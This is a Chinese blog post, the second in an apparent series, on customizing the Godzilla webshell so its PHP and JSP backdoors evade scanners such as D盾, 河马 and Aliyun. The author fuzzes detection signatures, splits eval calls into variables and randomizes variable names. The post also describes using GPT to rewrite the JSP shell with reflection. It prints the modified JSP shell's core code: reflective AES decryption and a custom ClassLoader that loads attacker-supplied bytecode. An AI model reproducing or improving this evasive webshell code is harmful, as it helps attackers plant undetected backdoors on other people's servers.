<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>哥斯拉二开从0到1-2(免杀) | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
btf.addGlobalFn('pjaxComplete', () => {
  _hmt.push(['_trackPageview',window.location.pathname])
}, 'baidu_analytics')
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
function gtag(){dataLayer.push(arguments)}
gtag('js', new Date())
gtag('config', 'G-3Z9EQ7RWNS')
btf.addGlobalFn('pjaxComplete', () => {
  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
}, 'google_analytics')
</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"SFZ331F775","apiKey":"d942c1c63cb7ca27d841499faf4a0ec8","indexName":"blogsearch","hitsPerPage":6,"languages":{"input_placeholder":"搜索文章","hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '哥斯拉二开从0到1-2(免杀)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/哥斯拉二开从0到1/image-20241114102655833.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">哥斯拉二开从0到1-2(免杀)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">哥斯拉二开从0到1-2(免杀)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-18T01:55:05.000Z" title="发表于 2024-11-18 09:55:05">2024-11-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-08T06:47:43.336Z" title="更新于 2025-02-08 14:47:43">2025-02-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4,636</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>有小伙伴提议说，我们上个文章改了一下哥斯拉的流量，但是在实际的应用中，我们打战肯定要先传木马落地，如果不能落地，那么你流量改的再好，其实也没有意义，想想，确实也是。没有第一步上传文件，哪里存在流量呢。</p>
<p>那么这次咱们来做一下免杀。在实际的应用中，似乎我们经常碰到安全设备，奈何咱这也没有啥安全设备，我们就采用常见的厂商的在线杀软吧。如果有小伙伴有的话，可以帮我测测，把结果告诉我，笔者再进行优化。</p>
<h5 id="php-免杀"><a href="#php-免杀" class="headerlink" title="php 免杀"></a>php 免杀</h5><p>我们用默认生成的文件，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118113734653.png" alt="image-20241118113734653"></p>
<p>拖到d盾中，看一下</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118114632737.png" alt="image-20241118114632737"></p>
<p>会报3级的双层变量，那好办，拿出来就行</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118114954546.png" alt="image-20241118114954546"></p>
<p>让他先等于一个变量，在传递就可以了。</p>
<p>完事之后，就可以了</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118150517857.png" alt="image-20241118150517857"></p>
<p>没有a.php了。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152210198.png" alt="image-20241118152210198"></p>
<p>河马报毒，我们使用fuzz方法看一下哪里有问题。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152338008.png" alt="image-20241118152338008"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152350132.png" alt="image-20241118152350132"></p>
<p>这里经过fuzz，这里有<code>$qianxinITUfjjXmxo2($_POST[$qianxinw7hJzkKxyi])</code>的时候，那么就报毒，那简单，直接给他拆出来，用变量写。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152548119.png" alt="image-20241118152548119"></p>
<p>这样写，就可以了</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152645497.png" alt="image-20241118152645497"></p>
<p>这里本地版的河马是没有问题了，但是吧，在线版的河马就是过不去，只要出现eval，就直接报。暂时没有太好的办法。在线加密也行，不过比较麻烦。这里就不写了</p>
<p>像d盾河马这种都是静态查杀的，他不管你里面的内容是什么，出现eval这种或者eval()  eval(chuanchan) 就会报，d盾还好解决一点，用类可以绕，但是把  河马死活绕不过，先搁下吧。</p>
<p>实际中，我们经常会见到一下商业waf，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118171049436.png" alt="image-20241118171049436"></p>
<p>微步没报，但是他这个gtp说可能有问题。</p>
<p>火绒和360。火绒和360对webshell其实是不敏感的，终端安全，对cs 或者msf的🐎都比较敏感，所以感觉这个，没啥意义。也测一下吧。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118182716236.png" alt="image-20241118182716236"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118182735288.png" alt="image-20241118182735288"></p>
<p>阿里云报了可疑，没有绕过去。这个eval没有过去</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120152721804.png" alt="image-20241120152721804"></p>
<p>好，php的免杀就先到这里吧。奈何笔者太菜了，动态的webshell查杀都过不去。</p>
<p>笔者在测试php5的时候，发现<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153557064.png" alt="image-20241120153557064"></p>
<p>http_response_code(404);这行代码时报错的</p>
<p>在php官网看，发现http_response_code只在(PHP 5 &gt;= 5.4.0, PHP 7, PHP 8)支持。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153706885.png" alt="image-20241120153706885"></p>
<p>不过，下面在十一年前，有大牛已经给出了解决方法，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153831577.png" alt="image-20241120153831577"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153956079.png" alt="image-20241120153956079"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120154307563.png" alt="image-20241120154307563"></p>
<p>好，这里我们就改完了。</p>
<p>用笔者开的这个工具，你会发现，每次生成的🐎都是一样的，注释什么的，和变量名，都一样。</p>
<p>我们想办法给他写一下，然他变动起来。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122110329067.png" alt="image-20241122110329067"></p>
<p>我们在原版中可以看到，读取哥斯拉默认生成模板bin文件后，会替换pass 和key。</p>
<p>那么相应的，我们定义几个变量，让他随机替换即可。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122110501144.png" alt="image-20241122110501144"></p>
<p>首先我们在方法里定义一个数组，然后进行随机排序，然后再给他拿出来用，就可以了。这里用了几个字符串。然后分别进行替换掉。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122110649176-17322448095041.png" alt="image-20241122110649176"></p>
<p>我们再在bin文件中，写上相应的所需要替换的字符串，这样就可以了。打包，编译。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122111132618.png" alt="image-20241122111132618"></p>
<p>这样，我们每次生成的木马就不一样了。就动态了。但是其实总体结构还是不变的。变得只是变量。</p>
<p>没事，能用就行，后面在优化。好了 php的免杀就先做到这里，下面是jsp的。</p>
<h5 id="jsp-免杀"><a href="#jsp-免杀" class="headerlink" title="jsp 免杀"></a>jsp 免杀</h5><p>环境：Apache Tomcat/9.0.65</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122143604309.png" alt="image-20241122143604309"></p>
<p>上来就是已知后门，那么肯定是被匹配到了关键字，fuzz一下。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122144122631.png" alt="image-20241122144122631"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122144144439.png" alt="image-20241122144144439"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122144208689.png" alt="image-20241122144208689"></p>
<p>在两次的🐎中可以看到，应该是匹配了cipher。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122152115554.png" alt="image-20241122152115554"></p>
<p>这里给他换成Unicode还是报，那可能还有关键词。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122152702167.png" alt="image-20241122152702167"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122152725481.png" alt="image-20241122152725481"></p>
<p>aes也有问题。ok,也给他编码一下，下半部分也有问题，改改。<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122155044933.png" alt="image-20241122155044933"></p>
<p>我们在改这个的时候发现就算有这一句，也报已知，那说明，这个里面的\u啥啥啥的也被标记了。</p>
<p>我们在测试的时候，发现阿里云拦截的，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125100859587-17325005401581.png" alt="image-20241125100859587"></p>
<p>这种反射加载类的   invoke方式肯定是被拦截的。所以，我们让gpt帮我们写一下。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101509813.png" alt="image-20241125101509813"></p>
<p>就类似于这种。这样的话，阿里云就不报了。</p>
<p>原本的哥斯拉分两半部分，上部分为定义的各种方法。如md5 base64 en decode  aes等，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101657763.png" alt="image-20241125101657763"></p>
<p>下半部分为，正真的传参逻辑。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101749460.png" alt="image-20241125101749460"></p>
<p>我们让gpt帮我们改一下，上半部分，用反射机制，并且避免invoke出现。</p>
<p>左边为没有下班部分，右边是有的</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101919130.png" alt="image-20241125101919130"></p>
<p>可以看到，上半部分已经没有问题了，下半部分还是有问题，放一下🐎。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125102230478.png" alt="image-20241125102230478"></p>
<p>阿里云也报，他是报的f.equals(pageContext);。那我们再改一下。🐎的核心逻辑。</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! </span><br><span class="line">    String xc = <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; </span><br><span class="line">    String pass = <span class="string">&quot;pass&quot;</span>; </span><br><span class="line">    String md5 = md5(pass + xc); </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">X</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(ClassLoader z)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(z);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">       <span class="function"><span class="keyword">public</span> Class <span class="title">Q</span><span class="params">(<span class="keyword">byte</span>[] cb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(<span class="keyword">null</span>, cb, <span class="number">0</span>, cb.length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="comment">// 可以在这里捕获并处理异常</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] x(<span class="keyword">byte</span>[] s, <span class="keyword">boolean</span> m) &#123; </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取 Cipher 类</span></span><br><span class="line">        Class&lt;?&gt; cipherClass = Class.forName(<span class="string">&quot;javax.crypto.Cipher&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 Cipher.getInstance(&quot;AES&quot;) 方法并调用</span></span><br><span class="line">        java.lang.reflect.Method getInstanceMethod = cipherClass.getMethod(<span class="string">&quot;getInstance&quot;</span>, String.class);</span><br><span class="line">        Object cipher = getInstanceMethod.invoke(<span class="keyword">null</span>, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 SecretKeySpec 类并创建对象</span></span><br><span class="line">        Class&lt;?&gt; secretKeySpecClass = Class.forName(<span class="string">&quot;javax.crypto.spec.SecretKeySpec&quot;</span>);</span><br><span class="line">        java.lang.reflect.Constructor&lt;?&gt; secretKeySpecConstructor = secretKeySpecClass.getConstructor(<span class="keyword">byte</span>[].class, String.class);</span><br><span class="line">        Object key = secretKeySpecConstructor.newInstance(xc.getBytes(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 Cipher.init 方法并调用</span></span><br><span class="line">        java.lang.reflect.Method initMethod = cipherClass.getMethod(<span class="string">&quot;init&quot;</span>, <span class="keyword">int</span>.class, java.security.Key.class);</span><br><span class="line">        initMethod.invoke(cipher, m ? <span class="number">1</span> : <span class="number">2</span>, key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 Cipher.doFinal 方法并调用</span></span><br><span class="line">        java.lang.reflect.Method doFinalMethod = cipherClass.getMethod(<span class="string">&quot;doFinal&quot;</span>, <span class="keyword">byte</span>[].class);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>[]) doFinalMethod.invoke(cipher, (Object) s);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        String ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.MessageDigest m;</span><br><span class="line">            m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">            ret = <span class="keyword">new</span> java.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 java.util.Base64</span></span><br><span class="line">            java.util.Base64.Encoder encoder = java.util.Base64.getEncoder();</span><br><span class="line">            <span class="keyword">return</span> encoder.encodeToString(bs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 避免 invoke 直接使用 Base64 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] base64Decode(String bs) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 java.util.Base64</span></span><br><span class="line">            java.util.Base64.Decoder decoder = java.util.Base64.getDecoder();</span><br><span class="line">            <span class="keyword">return</span> decoder.decode(bs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>知道哪里有问题，就好改了。</p>
<p>我们直接在d盾处删了  阿里云报的  f.是不行的，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125103728559.png" alt="image-20241125103728559"></p>
<p>改了一下变量名，也不行。</p>
<p>经过一天的测试，发现，好像绕不过阿里云了。，太菜了。先这样。</p>
<p>aliyun会匹配f.equals(pageContext);</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125172132547.png" alt="image-20241125172132547"></p>
<p>改成unicode也不行，aliyun是动态的，他会运行。其他的都用反射写好了。</p>
<p>哦，对了，还有一点就是这个defineClass(null, cb, 0, cb.length);方法。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125175603511.png" alt="image-20241125175603511"></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11368">https://xz.aliyun.com/t/11368</a></p>
<p>在这篇大师傅的文章中，详细说了这个，哥斯拉和冰蝎都是这样的需要defineClass方法来加载恶意类字节码，似乎需要自定义ClassLoader来绕过了。或者改payload了。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125180907351.png" alt="image-20241125180907351"></p>
